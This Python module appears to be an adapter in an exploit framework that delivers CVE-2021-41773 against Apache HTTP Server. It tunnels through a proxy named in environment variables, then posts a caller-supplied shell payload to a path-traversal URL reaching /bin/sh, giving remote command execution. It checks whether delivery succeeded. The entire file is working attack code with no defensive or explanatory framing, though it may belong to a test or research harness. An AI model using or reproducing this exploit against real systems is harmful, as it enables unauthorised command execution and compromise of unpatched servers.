"""Normalized Stockpile adapter for Apache HTTP Server CVE-2021-41773."""
import os
import socket
from urllib.parse import urlsplit


def _read_all(connection):
    chunks = []
    while True:
        chunk = connection.recv(65536)
        if not chunk:
            return b"".join(chunks)
        chunks.append(chunk)


def run(payload):
    target = urlsplit("http://" + os.environ["XCAPE_TARGET"])
    proxy = urlsplit(os.environ["XCAPE_PROXY_URL"])
    target_host = target.hostname
    target_port = target.port or 80
    with socket.create_connection((proxy.hostname, proxy.port or 80), timeout=15) as connection:
        destination = f"{target_host}:{target_port}"
        connection.sendall(f"CONNECT {destination} HTTP/1.1\r\nHost: {destination}\r\n\r\n".encode())
        response = b""
        while b"\r\n\r\n" not in response:
            response += connection.recv(4096)
        if not response.startswith(b"HTTP/1.1 200"):
            raise RuntimeError("Andromeda proxy CONNECT failed: " + response.decode(errors="replace"))
        body = b"echo Content-Type: text/plain; echo; " + payload + b"\n"
        path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
        request = (
            f"POST {path} HTTP/1.1\r\nHost: {target_host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode() + body
        connection.sendall(request)
        raw = _read_all(connection)
    status = raw.split(b"\r\n", 1)[0].decode(errors="replace")
    if " 200 " not in status:
        raise RuntimeError(f"CVE delivery failed: {status}; {raw[-2048:].decode(errors='replace')}")
    return {"delivered": True, "vulnerability_id": "CVE-2021-41773", "http_status": status}

